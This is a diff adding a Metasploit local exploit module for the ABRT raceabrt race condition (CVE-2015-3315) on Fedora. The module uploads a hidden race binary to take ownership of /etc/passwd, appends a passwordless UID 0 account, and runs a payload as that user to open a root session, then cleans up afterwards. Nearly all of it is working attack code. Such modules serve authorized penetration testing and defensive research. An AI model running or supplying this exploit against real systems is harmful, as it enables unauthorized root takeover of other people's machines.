@@ -1,0 +1,240 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'ABRT raceabrt Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Fedora systems with
+        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured
+        as the crash handler.
+
+        A race condition allows local users to change ownership of arbitrary
+        files (CVE-2015-3315). This module uses a symlink attack on
+        '/var/tmp/abrt/*/maps' to change the ownership of /etc/passwd,
+        then adds a new user with UID=0 GID=0 to gain root privileges.
+        Winning the race could take a few minutes.
+
+        This module has been tested successfully on ABRT packaged version
+        2.1.5-1.fc19 on Fedora Desktop 19 x86_64, 2.2.1-1.fc19 on Fedora Desktop
+        19 x86_64 and 2.2.2-2.fc20 on Fedora Desktop 20 x86_64.
+
+        Fedora 21 and Red Hat 7 systems are reportedly affected, but untested.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Tavis Ormandy', # Discovery and C exploit
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'DisclosureDate' => 'Apr 14 2015',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'References'     =>
+        [
+          [ 'CVE', '2015-3315' ],
+          [ 'EDB', '36747' ],
+          [ 'BID', '75117' ],
+          [ 'URL', 'https://gist.github.com/taviso/fe359006836d6cd1091e' ],
+          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],
+          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/16/12' ],
+          [ 'URL', 'https://github.com/abrt/abrt/commit/80408e9e24a1c10f85fd969e1853e0f192157f92' ],
+          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-1862' ],
+          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-3315' ],
+          [ 'URL', 'https://access.redhat.com/articles/1415483' ],
+          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],
+          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],
+          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1218239' ]
+        ]
+    ))
+    register_options(
+      [
+        OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '900' ]),
+        OptString.new('USERNAME', [ false, 'Username of new UID=0 user (default: random)', '' ]),
+        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+      ])
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def timeout
+    datastore['TIMEOUT']
+  end
+
+  def check
+    if cmd_exec('lsattr /etc/passwd').include? 'i'
+      vprint_error 'File /etc/passwd is immutable'
+      return CheckCode::Safe
+    end
+
+    kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern'
+    unless kernel_core_pattern.include? 'abrt-hook-ccpp'
+      vprint_error 'System is NOT configured to use ABRT for crash reporting'
+      return CheckCode::Safe
+    end
+    vprint_good 'System is configured to use ABRT for crash reporting'
+
+    if cmd_exec('[ -d /var/spool/abrt ] && echo true').include? 'true'
+      vprint_error "Directory '/var/spool/abrt' exists. System has been patched."
+      return CheckCode::Safe
+    end
+    vprint_good 'System does not appear to have been patched'
+
+    unless cmd_exec('[ -d /var/tmp/abrt ] && echo true').include? 'true'
+      vprint_error "Directory '/var/tmp/abrt' does NOT exist"
+      return CheckCode::Safe
+    end
+    vprint_good "Directory '/var/tmp/abrt' exists"
+
+    if cmd_exec('systemctl status abrt-ccpp | grep Active').include? 'inactive'
+      vprint_error 'abrt-ccp service NOT running'
+      return CheckCode::Safe
+    end
+    vprint_good 'abrt-ccpp service is running'
+
+    abrt_version = cmd_exec('yum list installed abrt | grep abrt').split(/\s+/)[1]
+    unless abrt_version.blank?
+      vprint_status "System is using ABRT package version #{abrt_version}"
+    end
+
+    CheckCode::Detected
+  end
+
+  def upload_and_chmodx(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    cmd_exec "chmod +x '#{path}'"
+    register_file_for_cleanup path
+  end
+
+  def exploit
+    if check != CheckCode::Detected
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    @chown_file = '/etc/passwd'
+
+    if datastore['USERNAME'].blank?
+      @username = rand_text_alpha rand(7..10)
+    else
+      @username = datastore['USERNAME']
+    end
+
+    # Upload Tavis Ormandy's raceabrt exploit:
+    # - https://www.exploit-db.com/exploits/36747/
+    # Cross-compiled with:
+    # - i486-linux-musl-cc -static raceabrt.c
+    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2015-3315', 'raceabrt'
+    fd = ::File.open path, 'rb'
+    executable_data = fd.read fd.stat.size
+    fd.close
+
+    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    upload_and_chmodx executable_path, executable_data
+
+    # Change working directory to base_dir
+    cmd_exec "cd '#{base_dir}'"
+
+    # Launch raceabrt executable
+    print_status "Trying to own '#{@chown_file}' - This might take a few minutes (Timeout: #{timeout}s) ..."
+    output = cmd_exec "#{executable_path} #{@chown_file}", nil, timeout
+    output.each_line { |line| vprint_status line.chomp }
+
+    # Check if we own /etc/passwd
+    unless cmd_exec("[ -w #{@chown_file} ] && echo true").include? 'true'
+      fail_with Failure::Unknown, "Failed to own '#{@chown_file}'"
+    end
+
+    print_good "Success! '#{@chown_file}' is writable"
+
+    # Add new user with no password
+    print_status "Adding #{@username} user to #{@chown_file} ..."
+    cmd_exec "echo '#{@username}::0:0::/root:/bin/bash' >> #{@chown_file}"
+
+    # Upload payload executable
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Execute payload executable
+    vprint_status 'Executing payload...'
+    cmd_exec "/bin/bash -c \"echo #{payload_path} | su - #{@username}&\""
+  end
+
+  def on_new_session(session)
+    if session.type.to_s.eql? 'meterpreter'
+      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
+    end
+
+    # Reinstate /etc/passwd root ownership and remove new user
+    root_owns_passwd = false
+    new_user_removed = false
+
+    if session.type.to_s.eql? 'meterpreter'
+      # Reinstate /etc/passwd root ownership
+      session.sys.process.execute '/bin/sh', "-c \"chown root:root #{@chown_file}\""
+
+      # Remove new user
+      session.sys.process.execute '/bin/sh', "-c \"sed -i 's/^#{@username}:.*$//g' #{@chown_file}\""
+
+      # Wait for clean up
+      Rex.sleep 5
+
+      # Check root ownership
+      passwd_stat = session.fs.file.stat(@chown_file).stathash
+      if passwd_stat['st_uid'] == 0 && passwd_stat['st_gid'] == 0
+        root_owns_passwd = true
+      end
+
+      # Check for new user in /etc/passwd
+      passwd_contents = session.fs.file.open(@chown_file).read.to_s
+      unless passwd_contents.include? "#{@username}:"
+        new_user_removed = true
+      end
+    elsif session.type.to_s.eql? 'shell'
+      # Reinstate /etc/passwd root ownership
+      session.shell_command_token "chown root:root #{@chown_file}"
+
+      # Remove new user
+      session.shell_command_token "sed -i 's/^#{@username}:.*$//g' #{@chown_file}"
+
+      # Check root ownership
+      passwd_owner = session.shell_command_token "ls -l #{@chown_file}"
+      if passwd_owner.to_s.include? 'root'
+        root_owns_passwd = true
+      end
+
+      # Check for new user in /etc/passwd
+      passwd_user = session.shell_command_token "grep '#{@username}:' #{@chown_file}"
+      unless passwd_user.to_s.include? "#{@username}:"
+        new_user_removed = true
+      end
+    end
+
+    unless root_owns_passwd
+      print_warning "Could not reinstate root ownership of #{@chown_file}"
+    end
+
+    unless new_user_removed
+      print_warning "Could not remove user '#{@username}' from #{@chown_file}"
+    end
+  rescue => e
+    print_error "Error during cleanup: #{e.message}"
+  ensure
+    super
+  end
+end
